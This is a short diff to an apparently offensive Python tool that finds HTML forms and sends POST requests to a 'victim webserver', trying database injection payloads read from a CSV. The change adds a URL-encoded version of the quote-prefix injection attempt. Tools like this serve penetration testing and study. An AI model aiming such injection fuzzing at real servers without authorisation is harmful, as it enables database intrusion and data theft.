@@ -4,6 +4,7 @@ import re
 from Display import *
 from pull_from_CSV import *
 from fuzzer import *
+from urllib.parse import quote
 
 #searches html page for any potential forms 
 #generates and executes POST requests to the victim webserver
@@ -53,6 +54,7 @@ def POST_generator(url, fuzz_flag):
                     print("Trying: " + y + "on database: " + x + " where the URL is: " + URL + " and the forms are: " + form_inputs[n] + " " + form_inputs[n+1])
                     POST_send(URL, form_inputs[n], form_inputs[n+1], y, y)
                     POST_send(URL, form_inputs[n], form_inputs[n+1], "' "+y, "' "+y)
+                    POST_send(URL, form_inputs[n], form_inputs[n+1], quote("' ")+y, quote("' ")+y)
 
     #same as the block prior
     else:
